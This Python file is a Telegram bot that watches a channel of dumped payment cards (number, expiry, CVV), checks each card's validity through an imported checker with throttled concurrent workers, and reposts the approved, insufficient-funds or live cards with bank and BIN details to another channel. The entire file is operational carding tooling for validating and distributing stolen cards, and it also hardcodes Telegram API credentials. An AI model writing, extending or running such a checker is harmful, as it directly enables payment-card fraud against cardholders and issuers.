"""
Pika Card Checker Bot
- Monitors @pikadump for dropped cards
- Checks via cooper.py Cooper() — 5 concurrent workers
- Posts Approved + Insufficient results to @pikaapproved
"""

import asyncio
import csv
import os
import re
import random

from telethon import TelegramClient, events
from telethon.sessions import StringSession

from cooper import Cooper

# ── Credentials ───────────────────────────────────────────────────────────────
API_ID   = 30048386
API_HASH = "cd49d577ef3ad3e601d9b44789ab630e"
SESSION  = os.environ.get("SESSION_STRING", "pika_session")

SOURCE_CHANNEL = "@pikadump"
TARGET_CHANNEL = "@pikaapproved"
IMAGE_PATH     = r"C:\Users\Administrator\Downloads\Untitled design.png"

# ── Concurrency config ────────────────────────────────────────────────────────
NUM_WORKERS    = 3     # 3 concurrent checks — more causes site timeouts
RATE_LIMIT_MIN = 5     # seconds to wait after each check (per worker)
RATE_LIMIT_MAX = 10

# ── BIN lookup ────────────────────────────────────────────────────────────────
BIN_DB: dict[str, dict] = {}

def load_bin_db(path: str = "bin-list-data.csv") -> None:
    with open(path, encoding="utf-8") as f:
        for row in csv.DictReader(f):
            BIN_DB[row["BIN"].strip()] = row

def lookup_bin(card_number: str) -> dict:
    for length in (8, 7, 6):
        key = card_number[:length]
        if key in BIN_DB:
            return BIN_DB[key]
    return {}

# ── Card parser ───────────────────────────────────────────────────────────────
CARD_RE = re.compile(r"\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b")

def extract_cards(text: str) -> list[str]:
    return [f"{m[1]}|{m[2]}|{m[3]}|{m[4]}" for m in CARD_RE.finditer(text or "")]

# ── Flag emoji helper ─────────────────────────────────────────────────────────
def country_flag(iso2: str) -> str:
    if not iso2 or len(iso2) != 2:
        return ""
    return "".join(chr(0x1F1E6 + ord(c) - ord("A")) for c in iso2.upper())

# ── Message builder ───────────────────────────────────────────────────────────
def build_message(card: str, bin_info: dict, result_type: str) -> str:
    """
    result_type: "approved" | "insufficient" | "live"
    """
    parts    = card.split("|")
    number   = parts[0]
    mm       = parts[1].zfill(2)
    yy       = parts[2]
    cvc      = parts[3]

    brand    = bin_info.get("Brand",       "UNKNOWN").upper()
    ctype    = bin_info.get("Type",        "UNKNOWN").upper()
    category = bin_info.get("Category",    "CLASSIC").upper()
    bank     = bin_info.get("Issuer",      "UNKNOWN BANK").upper()
    iso2     = bin_info.get("isoCode2",    "")
    bin6     = number[:6]
    flag     = country_flag(iso2)

    card_code = f"`{number}|{mm}|{yy}|{cvc}`"
    type_line = f"**{brand} • {ctype} • {category}**"

    lines = []

    if result_type == "approved":
        lines.append("Pika Approved this card (⁠つ✧ω✧⁠)⁠つ")
        lines.append("")
        lines.append(type_line)
        lines.append("")
        lines.append(card_code)
        lines.append("")
        lines.append(f"{bank} | {flag} {iso2}")
        lines.append(f"BIN: {bin6}")

    elif result_type == "insufficient":
        lines.append("Pika found insufficient card 💳")
        lines.append("")
        lines.append(type_line)
        lines.append("")
        lines.append(card_code)
        lines.append("")
        lines.append(f"{bank} | {flag} {iso2}")
        lines.append(f"BIN: {bin6}")

    else:  # live / not sure
        lines.append(type_line)
        lines.append("")
        lines.append(card_code)
        lines.append("")
        lines.append(f"{bank} | {flag} {iso2}")
        lines.append(f"BIN: {bin6}")
        lines.append("")
        lines.append("**Pika Not Sure this card it charge or not. But is Live <(￣︶￣)↗**")

    lines.append("")
    lines.append("Pika father @kokakeki")

    return "\n".join(lines)

# ── Queue & post lock ─────────────────────────────────────────────────────────
card_queue: asyncio.Queue = asyncio.Queue()
post_lock = asyncio.Lock()   # prevent simultaneous Telegram sends

# ── Single worker ─────────────────────────────────────────────────────────────
async def worker(worker_id: int, client: TelegramClient, target):
    while True:
        card = await card_queue.get()
        try:
            print(f"  [W{worker_id}] Checking: {card}")

            loop   = asyncio.get_event_loop()
            result = await loop.run_in_executor(None, Cooper, card)
            print(f"  [W{worker_id}] Result  : {result}")

            lower = result.strip().lower()

            # Classify result
            is_approved    = lower == "approved"
            is_insufficient = "insufficient" in lower
            is_live        = is_approved or "live" in lower

            if not is_approved and not is_insufficient and not is_live:
                print(f"  [W{worker_id}] SKIP — not approved/insufficient/live")
            else:
                result_type = (
                    "approved"    if is_approved    else
                    "insufficient" if is_insufficient else
                    "live"
                )

                bin_info = lookup_bin(card.split("|")[0])
                msg      = build_message(card, bin_info, result_type)

                # Serialize Telegram sends so messages don't interleave
                async with post_lock:
                    if os.path.isfile(IMAGE_PATH):
                        await client.send_file(
                            target,
                            IMAGE_PATH,
                            caption=msg,
                            parse_mode="md",
                        )
                    else:
                        await client.send_message(target, msg, parse_mode="md")

                print(f"  [W{worker_id}] POSTED ({result_type}) → {TARGET_CHANNEL}")

        except Exception as e:
            print(f"  [W{worker_id}] ERROR: {e}")

        finally:
            card_queue.task_done()
            delay = random.uniform(RATE_LIMIT_MIN, RATE_LIMIT_MAX)
            print(f"  [W{worker_id}] Waiting {delay:.1f}s...")
            await asyncio.sleep(delay)

# ── Main ──────────────────────────────────────────────────────────────────────
async def main():
    load_bin_db()
    print(f"[*] BIN database loaded: {len(BIN_DB):,} entries")

    client = TelegramClient(StringSession(SESSION), API_ID, API_HASH)
    await client.start()
    print("[*] Telegram client started")

    target = await client.get_entity(TARGET_CHANNEL)

    # Start NUM_WORKERS concurrent workers
    for i in range(1, NUM_WORKERS + 1):
        asyncio.create_task(worker(i, client, target))
    print(f"[*] {NUM_WORKERS} workers started")

    @client.on(events.NewMessage(chats=SOURCE_CHANNEL))
    async def handler(event):
        text  = event.message.message or ""
        cards = extract_cards(text)
        if not cards:
            return
        # Skip if queue is too large (site can't keep up)
        if card_queue.qsize() > 50:
            print(f"[!] Queue full ({card_queue.qsize()}), skipping {len(cards)} card(s)")
            return
        print(f"\n[+] {len(cards)} card(s) queued  (queue: {card_queue.qsize()})")
        for card in cards:
            await card_queue.put(card)

    print(f"[*] Listening on {SOURCE_CHANNEL} ...")
    await client.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())
